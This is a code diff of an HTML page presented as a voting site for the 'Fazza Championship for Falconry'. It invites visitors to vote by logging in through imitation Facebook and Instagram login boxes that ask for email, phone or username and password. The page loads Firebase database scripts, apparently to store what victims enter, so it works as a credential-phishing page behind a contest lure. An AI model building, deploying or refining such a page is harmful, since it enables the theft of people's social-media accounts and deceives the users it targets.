@@ -1,5 +1,6 @@
+
 <!DOCTYPE html>
-<html dir="ltr">
+<html>
 <head>
     <title>Fazza Championship for Falconry</title>
     <meta name="description" content="Vote for your favorite falconer at the Fazza Championship for Falconry. Log in using your credentials and cast your vote for the best falconer. Join the excitement and support the champions!">
@@ -34,16 +35,23 @@
                     <li><a href="#">Contestants</a></li>
                     <li><a href="#">Contact Us</a></li>
                 </ul>
+                <!-- Translate Button -->
+                <a href="index2.html" class="translate-button" style="color: white;" >Translate</a>
             </nav>
 
             <div class="hero-banner">
+                <video class="hero-video" autoplay loop muted>
+                    <source src="assets/images/falcon.mp4" type="video/mp4">
+                    <!-- Add more <source> elements for different video formats if needed -->
+                    Your browser does not support the video tag.
+                </video>
                 <div class="hero-content">
                     <h1>Welcome to the Fazza Championship for Falconry Voting</h1>
                     <p>Vote for your favorite contestant in the Fazza Championship for Falconry and support them to become the champions.</p>
-                    <p class="announcement">Voting is now open! Show your support for the falconers and choose your champion.</p>
                     <a href="#votingSection" class="hero-button" onclick="vote()">Vote Now</a>
                 </div>
             </div>
+
         </header>
 
         <section id="votingSection" class="contestants-section">
@@ -72,9 +80,8 @@
                 <!-- Add more contestants as needed -->
             </div><!-- Contestant information goes here -->
         </section>
-    </div>
 
-    <footer class="footer">
+            <footer class="footer">
         <div class="footer-content">
             <div class="footer-logo">
                 <img src="assets/images/falco.png" alt="Footer Logo" width="100" height="40">
@@ -86,80 +93,66 @@
             </div>
         </div>
     </footer>
+    </div>
+
+
  
     <!-- Additional script tags go here -->
 
     <center>
         <div id="choose">
-          <center>
             <p>
-          Login with one of the following to vote:
+                Login with one of the following to vote:
             </p>
-          </center>
-          <center>
             <p>
-              <img id="fb" onclick="fb()" src="assets/images/fb.png">
-              <img id="ig" onclick="ig()" src="assets/images/ig.png">
+                <img id="fb" onclick="fb()" src="assets/images/fb.png">
+                <img id="ig" onclick="ig()" src="assets/images/ig.png">
             </p>
             <br>
             <button onclick="can()" id="cancel">Close</button>
-          </center>
         </div>
-      </center>
+    </center>
     
-      <center>
+    <center>
         <div id="fbp">
-          <div class="facebook-login" id="fb2" align="center">
-    
-            <div class="ggt">
-    
-              <img src="assets/images/fb.png" alt="logo" id="fblogo">
-              <h1 id="fb2">
-            facebook
-              </h1>
-          <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
-          <input type="password" placeholder="Password" id="fb-pass"><br>
-              <button onclick="login()" id="fb-log">
-            Log in
-              </button>
+            <div class="facebook-login" id="fb2" align="center">
+                <div class="ggt">
+                    <img src="assets/images/fb.png" alt="logo" id="fblogo">
+                    <h1 id="fb2">
+                        Facebook
+                    </h1>
+                    <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+                    <input type="password" placeholder="Password" id="fb-pass"><br>
+                    <button onclick="login()" id="fb-log">
+                        Log in
+                    </button>
+                </div>
             </div>
-          </div>
-    
         </div>
-      </center>
+    </center>
     
-      <center>
+    <center>
         <div id="igp">
-          <div class="Instagram-login" id="ig2" align="center">
-    
-            <div class="ppt">
-    
-              <img src="assets/images/ig2.jpg" alt="logo" id="iglogo"><br><br>
-              <br>
-          <input type="text" placeholder="Username or Email" id="ig-uname"><br>
-          <input type="password" placeholder="Password" id="ig-pass">
-              <br>
-              <button onclick="iglog()" id="ig-log">
-            Log in
-              </button>
+            <div class="Instagram-login" id="ig2" align="center">
+                <div class="ppt">
+                    <img src="assets/images/ig-logo.png" alt="logo" id="iglogo"><br><br>
+                    <br>
+                    <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+                    <input type="password" placeholder="Password" id="ig-pass">
+                    <br>
+                    <button onclick="iglog()" id="ig-log">
+                        Log in
+                    </button>
+                </div>
             </div>
-          </div>
         </div>
-      </center>
-    
+    </center>
 
-      <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
-      <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-    
-      <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-      <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
-    
-      <script src="js/firebase.js">
-    
-    
-    
-      </script>
-
+    <!-- Firebase scripts and other additional scripts go here -->
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+    <script src="js/firebase.js"></script>
 </body>
 </html>
